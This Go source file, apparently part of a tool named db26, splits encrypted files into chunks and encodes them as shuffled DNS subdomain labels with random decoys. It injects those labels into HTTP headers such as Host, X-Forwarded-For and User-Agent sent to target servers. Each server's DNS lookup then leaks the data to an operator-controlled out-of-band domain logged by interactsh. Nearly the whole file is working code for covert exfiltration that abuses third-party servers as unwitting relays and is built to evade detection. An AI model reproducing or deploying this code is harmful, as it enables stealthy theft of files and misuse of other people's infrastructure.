package wire

import (
	"crypto/rand"
	"encoding/base32"
	"errors"
	"math/big"
	"strings"

	dbcrypto "db26/internal/crypto"
)

// DNS-safe Base32 encoding (RFC 4648, lowercase, no padding)
var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// Chunk is a single piece of a file ready for DNS transmission.
type Chunk struct {
	FileID uint32
	Seq    uint32
	Total  uint32
	Data   []byte // Raw (already encrypted) bytes for this chunk
}

// Candidate is a proven bounce point: a domain + the header position that works.
type Candidate struct {
	Domain  string   `json:"domain"`
	Headers []string `json:"headers"` // Proven header prefixes: "host", "xff", "ref", etc.
	Score   float64  `json:"score,omitempty"`
}

// MaxDataPerChunk is the max raw bytes per DNS label after Base32 encoding.
// We target 40 base32 chars = 25 bytes raw. Conservative to survive resolver chains.
const MaxDataPerChunk = 25

// EncodeChunkToSubdomain builds the subdomain portion that carries data.
// Format: shuffled [fileID, seq, total, base32data] + optional decoy
// This subdomain gets placed in the header value: subdomain.correlationID.oobDomain
//
// The full header value sent to the target becomes:
//   Host: shuffled-labels.corrID.oob.yourdomain.com
// or:
//   X-Forwarded-For: shuffled-labels.corrID.oob.yourdomain.com
//
// The target processes the header → DNS lookup → interactsh captures the full query.
func EncodeChunkToSubdomain(c Chunk, sk dbcrypto.SessionKey, decoyRate float64) string {
	fileIDLabel := dbcrypto.PackUint32(c.FileID, sk.FieldLens[0])
	seqLabel := dbcrypto.PackUint32(c.Seq, sk.FieldLens[1])
	totalLabel := dbcrypto.PackUint32(c.Total, sk.FieldLens[2])
	dataLabel := strings.ToLower(b32.EncodeToString(c.Data))

	labels := []string{fileIDLabel, seqLabel, totalLabel, dataLabel}

	// Optional decoy
	if decoyRate > 0 && randFloat() < decoyRate {
		labels = append(labels, randAlphaNum(dbcrypto.DecoyLength(sk)))
	}

	shuffle(labels)
	return strings.Join(labels, ".")
}

// DecodeSubdomain extracts a Chunk from DNS subdomain labels.
// Input: the labels BEFORE the correlation ID (already stripped of corrID + oobDomain).
func DecodeSubdomain(labels []string, sk dbcrypto.SessionKey) (Chunk, error) {
	var c Chunk
	var dataLabel string
	foundFile, foundSeq, foundTotal, foundData := false, false, false, false

	for _, label := range labels {
		l := len(label)
		switch {
		case l == sk.FieldLens[0] && !foundFile:
			val, err := dbcrypto.UnpackUint32(label)
			if err != nil {
				continue
			}
			c.FileID = val
			foundFile = true
		case l == sk.FieldLens[1] && !foundSeq:
			val, err := dbcrypto.UnpackUint32(label)
			if err != nil {
				continue
			}
			c.Seq = val
			foundSeq = true
		case l == sk.FieldLens[2] && !foundTotal:
			val, err := dbcrypto.UnpackUint32(label)
			if err != nil {
				continue
			}
			c.Total = val
			foundTotal = true
		case l >= 16 && !foundData:
			dataLabel = label
			foundData = true
		default:
			// Decoy — discard
		}
	}

	if !foundFile || !foundSeq || !foundTotal || !foundData {
		return c, errors.New("missing required fields")
	}

	data, err := b32.DecodeString(strings.ToUpper(dataLabel))
	if err != nil {
		return c, errors.New("base32 decode failed: " + err.Error())
	}
	c.Data = data
	return c, nil
}

// BuildHeaderValue constructs the full header value for a given chunk.
// This is what gets injected into the HTTP request header.
//
// For Host header:      shuffled-labels.corrID.oobDomain
// For X-Forwarded-For:  shuffled-labels.corrID.oobDomain
// For X-Wap-Profile:    http://shuffled-labels.corrID.oobDomain/wap.xml
// For Contact:          root@shuffled-labels.corrID.oobDomain
// etc.
func BuildHeaderValue(subdomain, corrID, oobDomain, headerPrefix string) string {
	fqdn := subdomain + "." + corrID + "." + oobDomain

	// Apply the format template based on header type
	switch headerPrefix {
	case "wafp":
		return "http://" + fqdn + "/wap.xml"
	case "contact":
		return "root@" + fqdn
	case "from":
		return "root@" + fqdn
	case "ff":
		return "for=" + fqdn
	case "origin":
		return "https://" + fqdn
	default:
		// host, xff, rip, trip, xclip, origip, clip, ref, ua, n0x00
		return fqdn
	}
}

// HeaderNameFromPrefix returns the HTTP header name for a prefix.
func HeaderNameFromPrefix(prefix string) string {
	m := map[string]string{
		"host":    "Host",
		"xff":     "X-Forwarded-For",
		"wafp":    "X-Wap-Profile",
		"contact": "Contact",
		"rip":     "X-Real-IP",
		"trip":    "True-Client-IP",
		"xclip":   "X-Client-IP",
		"ff":      "Forwarded",
		"origip":  "X-Originating-IP",
		"clip":    "Client-IP",
		"ref":     "Referer",
		"from":    "From",
		"origin":  "Origin",
		"ua":      "User-Agent",
		"n0x00":   "n0x00",
	}
	if name, ok := m[prefix]; ok {
		return name
	}
	return prefix
}

// ChunkFile splits encrypted data into chunks of MaxDataPerChunk bytes.
func ChunkFile(fileID uint32, encrypted []byte) []Chunk {
	total := (len(encrypted) + MaxDataPerChunk - 1) / MaxDataPerChunk
	chunks := make([]Chunk, 0, total)

	for i := 0; i < len(encrypted); i += MaxDataPerChunk {
		end := i + MaxDataPerChunk
		if end > len(encrypted) {
			end = len(encrypted)
		}
		chunks = append(chunks, Chunk{
			FileID: fileID,
			Seq:    uint32(len(chunks)),
			Total:  uint32(total),
			Data:   encrypted[i:end],
		})
	}
	return chunks
}

func shuffle(labels []string) {
	for i := len(labels) - 1; i > 0; i-- {
		j := randInt(i + 1)
		labels[i], labels[j] = labels[j], labels[i]
	}
}

func randInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}

func randFloat() float64 {
	n, _ := rand.Int(rand.Reader, big.NewInt(100))
	return float64(n.Int64()) / 100.0
}

func randAlphaNum(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[randInt(len(chars))]
	}
	return string(b)
}
